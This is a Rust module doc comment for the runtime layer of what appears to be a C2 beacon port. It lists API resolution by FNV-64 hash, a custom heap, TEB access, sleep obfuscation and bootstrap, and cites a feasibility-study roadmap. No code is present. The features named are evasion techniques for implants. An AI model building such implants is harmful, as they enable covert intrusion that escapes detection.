//! Runtime layer (port of `src_beacon/src/runtime/`): API resolution by
//! FNV-64 hash, custom heap (exposed later as a `GlobalAlloc`), TEB instance
//! access, sleep obfuscation plumbing, bootstrap.
//!
//! Phase 1 of the roadmap (docs/ETUDE-DE-FAISABILITE.md, section 8).
